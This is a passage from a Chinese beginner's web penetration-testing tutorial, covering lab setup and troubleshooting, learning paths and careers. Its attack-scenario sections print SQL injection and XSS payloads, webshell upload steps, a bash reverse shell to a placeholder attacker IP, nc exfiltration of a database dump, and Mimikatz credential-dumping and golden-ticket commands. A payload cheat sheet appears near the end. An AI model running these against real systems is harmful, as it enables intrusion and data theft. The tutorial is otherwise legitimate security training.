  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt
```

3. **Web技术识别**
```bash
whatweb 目标URL
```

4. **子域名枚举**
```bash
sublist3r -d 目标域名
```

#### 阶段2：漏洞发现

**目标**：发现可利用的漏洞

**测试项目**：

1. **SQL 注入测试**
   - 登录页面：`admin' OR '1'='1`
   - 搜索框：`test' UNION SELECT 1,2,3--`
   - 使用 Burp Suite Intruder 批量测试

2. **XSS 测试**
   - 搜索框：`<script>alert(1)</script>`
   - 评论框：`<img src=x onerror=alert(1)>`

3. **文件上传测试**
   - 上传 `shell.php`
   - 上传 `.php5`、`.phtml` 等绕过
   - 上传图片马

4. **CSRF 测试**
   - 检查是否有 CSRF Token
   - 手动构造 CSRF 攻击页面

#### 阶段3：漏洞利用

**目标**：利用漏洞获取系统权限

**步骤**：

1. **利用 SQL 注入获取管理员账号密码**
   ```bash
   sqlmap -u "登录URL" --cookie="cookie" --dbs
   sqlmap -u "登录URL" --cookie="cookie" -D "数据库名" --tables
   sqlmap -u "登录URL" --cookie="cookie" -D "数据库名" -T "admin" --dump
   ```

2. **登录管理员后台**
   - 使用获取的账号密码登录
   - 寻找文件上传功能

3. **上传 Webshell**
   - 上传 PHP 一句话木马
   - 访问：`http://目标IP/uploads/shell.php?cmd=whoami`

4. **权限提升**
   - 查看系统信息
   - 尝试提权漏洞
   - 获取敏感数据

#### 阶段4：后渗透

**目标**：维持访问、横向渗透、数据窃取

**步骤**：

1. **反弹 Shell**
   ```bash
   # 在服务器上执行
   bash -i >& /dev/tcp/攻击机IP/4444 0>&1
   ```

2. **提权**
   ```bash
   # 查看内核版本
   uname -a
   
   # 查看漏洞
   searchsploit 内核版本
   ```

3. **数据窃取**
   ```bash
   # 备份数据库
   mysqldump -u root -p 数据库名 > backup.sql
   
   # 传输到攻击机
   nc 攻击机IP 4444 < backup.sql
   ```

---

### 场景二：企业内网渗透测试

#### 阶段1：外网突破

**目标**：从外网进入内网

**步骤**：

1. **信息收集**
   - 子域名枚举
   - 旁站查询
   - 证书透明度日志查询

2. **漏洞发现**
   - Web应用漏洞
   - 邮件服务器漏洞
   - VPN漏洞

3. **获取入口**
   - SQL注入获取账号
   - XSS窃取Cookie
   - 弱口令暴力破解

#### 阶段2：内网横向渗透

**目标**：从入口点横向移动到内网其他主机

**步骤**：

1. **信息收集**
   ```bash
   # 获取本机信息
   ipconfig / ifconfig
   netstat -ano / netstat -tulnp
   arp -a
   
   # 扫描内网
   nmap -sn 192.168.1.0/24
   ```

2. **内网端口扫描**
   ```bash
   nmap -sV -p 445,3389,22,80,443 192.168.1.1-100
   ```

3. **漏洞利用**
   - MS17-010（永恒之蓝）
   - SMB漏洞
   - RDP暴力破解
   - 域渗透攻击

#### 阶段3：域控渗透

**目标**：获取域控权限

**步骤**：

1. **枚举域信息**
   ```bash
   # 使用Mimikatz
   mimikatz.exe "lsadump::lsa /patch" "exit"
   
   # 获取域控哈希
   mimikatz.exe "lsadump::dcsync /domain:域名 /all /csv" "exit"
   ```

2. **黄金票据攻击**
   ```bash
   # 获取KRBTGT哈希
   mimikatz.exe "kerberos::golden /user:Administrator /domain:域名 /sid:SID /krbtgt:哈希 /ptt" "exit"
   ```

3. **访问域控**
   ```bash
   psexec \\域控IP cmd
   ```

---

## 第六部分：常见问题解决

### Docker 相关问题

#### 问题1：镜像拉取超时或缓慢

**错误现象**：
```
Error response from daemon: Get "https://registry-1.docker.io/v2/": 
net/http: request canceled while waiting for connection 
(Client.Timeout exceeded while awaiting headers)
```

**原因**：Docker 官方镜像库在国内访问非常慢，导致连接超时。

**解决方法一：配置国内镜像加速（推荐，永久解决）**

**Windows/Mac 用户（Docker Desktop）**：

1. 右键任务栏 Docker 图标 → **"Settings"**
2. 选择左侧 **"Docker Engine"**
3. 将配置内容替换为：
```json
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ],
  "builder": {
    "gc": {
      "defaultKeepStorage": "20GB",
      "enabled": true
    }
  },
  "experimental": false
}
```

⚠️ **注意**：如果看到重复的 `"registry-mirrors"` 字段，删除其中一个，只保留一个完整的配置块。

4. 点击 **"Apply & Restart"**
5. 等待 Docker 重启完成（约1-2分钟）
6. 重新执行：
```bash
docker pull webgoat/webgoat
```

**Linux 用户（Ubuntu/Debian/Kali）**：

```bash
# 1. 创建 Docker 配置目录
sudo mkdir -p /etc/docker

# 2. 配置镜像加速（多节点）
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ]
}
EOF

# 3. 重启 Docker 服务
sudo systemctl daemon-reload
sudo systemctl restart docker

# 4. 验证配置（应该看到镜像地址）
docker info | grep -A 10 "Registry Mirrors"

# 5. 重新拉取镜像
docker pull webgoat/webgoat
```

**解决方法二：使用代理（临时方案）**

如果你有代理软件（如 Clash、V2Ray），可以临时配置：

**Windows/Mac**：
```bash
# Docker Desktop 中：
# Settings → Resources → Proxies
# 选择 "Manual proxy configuration"
# HTTP proxy: 127.0.0.1:7890
# HTTPS proxy: 127.0.0.1:7890
```

**Linux**：
```bash
# 临时设置代理（假设代理端口是 7890）
export http_proxy=http://127.0.0.1:7890
export https_proxy=http://127.0.0.1:7890

# 拉取镜像
docker pull webgoat/webgoat

# 取消代理（拉取完成后）
unset http_proxy
unset https_proxy
```

**解决方法三：手动下载镜像（最笨但最稳）**

如果以上方法都失败，可以手动下载镜像文件：

1. 访问国内镜像站下载镜像：
   - 阿里云镜像：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors
   - 腾讯云镜像：https://mirror.ccs.tencentyun.com

2. 使用 `docker load` 加载：
```bash
# 假设你下载了 webgoat.tar
docker load -i webgoat.tar
```

**镜像加速效果对比**：

| 方式 | 速度 | 典型下载时间 |
|------|------|-------------|
| 官方源（无加速） | 10-50 KB/s | 2-10小时 |
| 国内镜像加速 | 5-20 MB/s | 30秒-5分钟 |
| 代理加速 | 10-50 MB/s | 20秒-2分钟 |

**验证是否成功**：

```bash
# 1. 查看镜像加速配置
docker info | grep -A 10 "Registry Mirrors"

# 2. 测试拉取一个小镜像（速度快说明配置成功）
docker pull hello-world

# 3. 再次拉取目标镜像
docker pull webgoat/webgoat
```

**快速测试（确认镜像加速生效）**：

```bash
# 测试拉取一个很小的镜像
time docker pull alpine:latest

# 如果在 10 秒内完成，说明配置成功
# 如果仍然超时，检查网络或尝试其他镜像源
```

**常见问题排查**：

1. **配置后仍然报错**
   - 可能原因：Docker 未正确重启
   - 解决：
     ```bash
     # Linux
     sudo systemctl stop docker
     sudo systemctl start docker
     
     # Windows/Mac
     # 完全退出 Docker Desktop（右键图标 → Quit Docker Desktop）
     # 重新启动 Docker Desktop
     ```

2. **镜像加速器失效**
   - 可能原因：某些镜像节点暂时不可用
   - 解决：
     ```bash
     # 尝试只使用一个镜像源
     sudo tee /etc/docker/daemon.json <<-'EOF'
     {
       "registry-mirrors": [
         "https://docker.m.daocloud.io"
       ]
     }
     EOF
     
     sudo systemctl daemon-reload
     sudo systemctl restart docker
     ```

3. **防火墙拦截**
   - 可能原因：防火墙阻止了 Docker 的网络连接
   - 解决：
     ```bash
     # Linux: 临时关闭防火墙测试
     sudo systemctl stop firewalld
     
     # 或添加 Docker 例外
     sudo firewall-cmd --permanent --add-service=docker
     sudo firewall-cmd --reload
     ```

**额外建议：批量拉取常用镜像**

配置好镜像加速后，可以一次性拉取所有常用镜像：

```bash
# 创建批量拉取脚本
cat > pull_all.sh << 'EOF'
#!/bin/bash
echo "开始拉取常用镜像..."

docker pull vulnerables/web-dvwa
docker pull webgoat/webgoat
docker pull bkimminich/juice-shop
docker pull nginx:latest
docker pull mysql:latest

echo "所有镜像拉取完成！"
EOF

chmod +x pull_all.sh
./pull_all.sh
```

**定期清理无用镜像**：

```bash
# 清理未使用的镜像
docker image prune -a

# 查看镜像占用空间
docker system df
```

#### 问题2：容器无法启动

**解决**：
```bash
# 查看容器日志
docker logs 容器名

# 检查端口占用
sudo netstat -tulnp | grep 端口号

# 修改端口映射
docker stop 容器名
docker rm 容器名
docker run -d -p 新端口:80 --name 容器名 镜像名
```

#### 问题3：权限不足（Linux）

**解决**：
```bash
# 将用户加入docker组
sudo usermod -aG docker $USER
newgrp docker
```

### 工具使用问题

#### 问题1：Burp Suite 无法抓包

**解决**：
1. 检查浏览器代理设置是否正确（127.0.0.1:8080）
2. 确认 Burp Suite 已启动且拦截模式开启
3. 检查 CA 证书是否已安装并信任
4. 关闭浏览器其他代理插件（如FoxyProxy配置错误）
5. 尝试使用隐私模式或无痕模式

#### 问题2：Nmap 扫描无结果

**解决**：
```bash
# 检查目标主机是否可达
ping 目标IP

# 确认防火墙规则是否允许扫描
# 或使用 -Pn 跳过主机发现
nmap -Pn -sV 目标IP

# 使用 -T4 加速扫描
nmap -T4 -sV -p- 目标IP
```

#### 问题3：SQLMap 无法注入

**解决**：
```bash
# 指定 Cookie
sqlmap -u "URL" --cookie="cookie值"

# 指定 User-Agent
sqlmap -u "URL" --random-agent

# 增加级别
sqlmap -u "URL" --level=5 --risk=3

# 使用 POST 请求
sqlmap -u "URL" --data="post数据"

# 查看详细输出
sqlmap -u "URL" -v 3
```

### 环境问题

#### 问题1：DVWA 无法访问

**解决**：
```bash
# 检查容器是否运行
docker ps | grep dvwa

# 如果未运行，启动容器
docker start dvwa

# 检查端口
sudo netstat -tulnp | grep 8080

# 重新初始化数据库
# 访问 http://localhost:8080
# 点击 "Create / Reset Database"
```

#### 问题2：VulHub 环境启动失败

**解决**：
```bash
# 查看详细日志
docker-compose logs

# 检查端口冲突
sudo netstat -tulnp | grep 端口

# 修改 docker-compose.yml 中的端口
# 编辑文件
nano docker-compose.yml
# 修改 ports 字段
# 重新启动
docker-compose down
docker-compose up -d
```

#### 问题3：Kali 网络无法连接

**解决**：
```bash
# 重启网络服务
sudo systemctl restart networking

# 重启网络接口
sudo ip link set eth0 down
sudo ip link set eth0 up

# 检查IP配置
ip a

# 修改 /etc/network/interfaces（如果需要）
sudo nano /etc/network/interfaces
```

---

## 附录：学习资源与进阶路径

### 常用命令速查表

#### Docker 命令
```bash
# 基础操作
docker pull <镜像名>              # 拉取镜像
docker run [参数] <镜像名>        # 运行容器
docker ps                         # 查看运行中的容器
docker ps -a                      # 查看所有容器
docker stop <容器ID>              # 停止容器
docker rm <容器ID>                # 删除容器
docker logs <容器ID>              # 查看日志

# 常用参数
-d                                # 后台运行
-p <主机端口>:<容器端口>          # 端口映射
--name <容器名>                   # 命名容器
-v <主机路径>:<容器路径>          # 挂载目录
```

#### Kali Linux 常用工具
```bash
# 信息收集
nmap -sV <目标IP>                 # 端口扫描
gobuster dir -u <目标URL> <字典>  # 目录扫描
whatweb <目标URL>                 # Web技术识别

# 漏洞利用
sqlmap -u <URL>                   # SQL注入测试
msfconsole                       # 启动Metasploit
burpsuite                        # 启动Burp Suite

# 后渗透
nc -lvnp <端口>                   # 监听端口
python -m http.server <端口>      # 启动HTTP服务器
```

#### SQL 注入 Payload 速查
| 类型 | Payload |
|------|---------|
| 判断注入 | `' OR '1'='1` |
| 获取版本 | `' UNION SELECT 1, version()--` |
| 获取数据库 | `' UNION SELECT 1, database()--` |
| 获取用户 | `' UNION SELECT user(), 2--` |
| 获取表 | `' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--` |
| 获取列 | `' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--` |

---

### 学习路径建议

#### 初级阶段（1-3个月）

**目标**：掌握基础漏洞原理和工具使用

**学习内容**：
1. 完成本教程所有复现（4种环境至少掌握1种）
2. 掌握 Burp Suite、Nmap 等基础工具
3. 完成 DVWA 所有模块的 Low/Medium 难度
4. 完成 PortSwigger Academy 的 Apprentice 级别实验

**推荐资源**：
- 本教程
- PortSwigger Web Security Academy
- 《Web安全深度剖析》

**输出**：
- 能独立发现和利用常见Web漏洞
- 能使用工具进行基础渗透测试

#### 中级阶段（3-6个月）

**目标**：熟练掌握各类漏洞，能进行实战渗透

**学习内容**：
1. 学习 VulHub 中的真实漏洞环境（50+个）
2. 掌握 SQLMap、Metasploit 等工具的进阶使用
3. 学习编写简单的漏洞利用脚本
4. 完成 TryHackMe 的初中级房间
5. 学习源代码审计

**推荐资源**：
- VulHub
- TryHackMe
- 《白帽子讲Web安全》
- 《Metasploit渗透测试魔鬼训练营》

**输出**：
- 能独立完成中型靶场渗透
- 能编写简单利用脚本
- 能进行代码审计

#### 高级阶段（6-12个月）

**目标**：准备认证考试或求职

**学习内容**：
1. 参加 Hack The Box
2. 学习高级渗透技术（域渗透、内网渗透）
3. 参加 CTF 竞赛
4. 准备 OSCP、CEH 等认证
5. 学习渗透测试方法论和报告编写

**推荐资源**：
- Hack The Box
- HackTheBox Academy
- OffSec OSCP 课程
- 《红队实战》

**输出**：
- 通过 OSCP 认证
- 能独立完成大型渗透项目
- 能带领团队进行渗透测试

---

### 推荐学习资源

#### 官方文档
- OWASP 官网：https://owasp.org/
- Kali 官网：https://www.kali.org/
- VulHub 官网：https://vulhub.org/
- PortSwigger Academy：https://portswigger.net/web-security

#### 中文社区
- FreeBuf：https://www.freebuf.com/
- 先知社区：https://xz.aliyun.com/
- 看雪学院：https://bbs.pediy.com/
- 吾爱破解：https://www.52pojie.cn/
- 安全客：https://www.anquanke.com/

#### 在线靶场
- TryHackMe：https://tryhackme.com/
- Hack The Box：https://www.hackthebox.com/
- 攻防世界：https://adworld.xctf.org.cn/
- Bugku CTF：https://ctf.bugku.com/

#### 书籍推荐
| 书籍 | 难度 | 推荐指数 |
|------|------|---------|
| 《白帽子讲Web安全》 | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| 《Web安全深度剖析》 | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| 《Metasploit渗透测试魔鬼训练营》 | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| 《内网安全攻防》 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 《CTF竞赛权威指南》 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

---

### 认证考试推荐

| 认证 | 难度 | 费用 | 价值 |
|------|------|------|------|
| **OSCP** | ⭐⭐⭐⭐⭐ | $1499 | ⭐⭐⭐⭐⭐ |
| **CEH** | ⭐⭐⭐ | $1199 | ⭐⭐⭐⭐ |
| **eJPT** | ⭐⭐⭐ | $399 | ⭐⭐⭐⭐ |
| **OSWE** | ⭐⭐⭐⭐⭐ | $2499 | ⭐⭐⭐⭐⭐ |
| **PNPT** | ⭐⭐⭐⭐ | $399 | ⭐⭐⭐⭐ |

**认证建议**：
- 新手：先考 eJPT 建立信心
- 中级：考取 CEH 建立理论基础
- 高级：挑战 OSCP 成为实战专家
- 代码审计：OSWE（Web exploit专家）

---

### 职业发展路径

#### 路径1：渗透测试工程师
**初级** → **中级** → **高级** → **安全专家**

**技能要求**：
- Web渗透（必需）
- 内网渗透（必需）
- 渗透测试方法论（必需）
- 报告编写（必需）
- 代码审计（加分）
- 移动安全（加分）

**薪资范围**：
- 初级：8K-15K
- 中级：15K-25K
- 高级：25K-40K
- 专家：40K+

#### 路径2：安全开发工程师
**初级** → **中级** → **高级** → **架构师**

**技能要求**：
- 编程能力（Java/Python/Go）
- Web开发框架
- 安全编码规范
- 代码审计
- 漏洞修复

**薪资范围**：
- 初级：10K-18K
- 中级：18K-30K
- 高级：30K-50K

#### 路径3：安全运营工程师（SOC）
**初级** → **中级** → **高级** → **SOC主管**

**技能要求**：
- 日志分析
- 威胁情报
- SIEM使用
- 应急响应
- 安全设备配置

**薪资范围**：
- 初级：8K-15K
- 中级：15K-25K
- 高级：25K-35K

#### 路径4：红队成员
**初级** → **中级** → **高级** → **红队队长**

**技能要求**：
- 全方位渗透技术
- 社会工程学
- 免杀技术
- APT攻击模拟
- 钓鱼攻击

**薪资范围**：
- 初级：15K-25K
- 中级：25K-40K
- 高级：40K-60K+

---

## 总结与展望

### 本教程核心价值

**1. 灵活的环境搭建方案**
- 4种方案满足不同需求
- 可根据硬件、系统、网络条件自由选择
- 支持多环境共存和切换

**2. 零基础友好**
- 详细步骤，手把手教学
- 生活化类比，易懂易记
- 常见问题全覆盖

**3. 实战导向**
- 真实漏洞环境
- 完整复现步骤
- 可直接应用于实战

**4. 系统化学习路径**
- 从入门到进阶到高级
- 明确的学习目标和输出
- 配套资源推荐

### 学习建议

**给零基础新手**：
1. 从方案4（PortSwigger）开始，建立学习信心
2. 配合方案1（Docker）部署DVWA，动手实践
3. 完成本教程所有复现
4. 坚持每天学习2小时，3个月入门

**给有基础学习者**：
1. 重点攻克方案2（VulHub）的真实漏洞
2. 深入学习源代码审计
3. 参加 CTF 竞赛，提升实战能力
4. 准备 OSCP 认证，成为专家

**给职业转型者**：
1. 系统学习网络安全知识体系
2. 搭建完整渗透测试环境（方案3）
3. 获取权威认证（CEH → OSCP）
4. 积累实战经验，准备求职

### 重要提醒

**技术是双刃剑**：
- 本教程所有技术仅供学习使用
- 严禁用于非法用途
- 所有操作必须在授权环境进行
- 违反法律将承担刑事责任

**学习建议**：
- 理解原理胜过机械操作
- 动手实践胜过阅读理论
- 持续学习，安全领域变化很快
- 遵守法律底线，做有道德的安全从业者

### 最后的话

网络安全是一个充满挑战和机遇的领域。无论你是出于兴趣爱好，还是职业发展，选择这条路都不会让你失望。

**记住**：
- 没有绝对安全的系统
- 攻防博弈永无止境
- 技术日新月异，必须持续学习
- 道德和法律是底线

**祝你在 Web 安全学习之路上越走越远！**

---

**文档维护**：欢迎提出问题和建议，共同完善本教程  
**反馈渠道**：通过学习社区或技术论坛交流  
**更新计划**：每年更新一次，跟进最新漏洞和技术  

---

**教程版本**：v3.0 完整整合版  
**最后更新**：2026年3月  
**适用人群**：零基础网络安全学习者  
**字数统计**：约 35,000 字  

**祝你学习愉快，但记住：技术用于防护，而非破坏！** 🛡️
